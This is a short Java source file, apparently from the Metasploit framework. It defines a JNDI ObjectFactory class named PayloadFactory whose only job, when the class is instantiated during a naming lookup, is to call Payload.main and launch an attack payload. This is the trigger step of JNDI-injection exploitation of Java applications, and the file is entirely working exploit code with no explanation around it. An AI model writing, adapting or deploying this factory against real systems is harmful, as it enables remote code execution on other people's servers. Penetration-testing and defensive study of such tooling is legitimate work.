package metasploit;
import java.util.Hashtable;
import javax.naming.*;
// by mihi (Michael Schierl)/@schierlm
public class PayloadFactory implements javax.naming.spi.ObjectFactory {
	// Required method override to be a valid Factory
	public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
		// System.out.println("Loading via factory...");
		Payload.main(null);
		return null;
	}
}

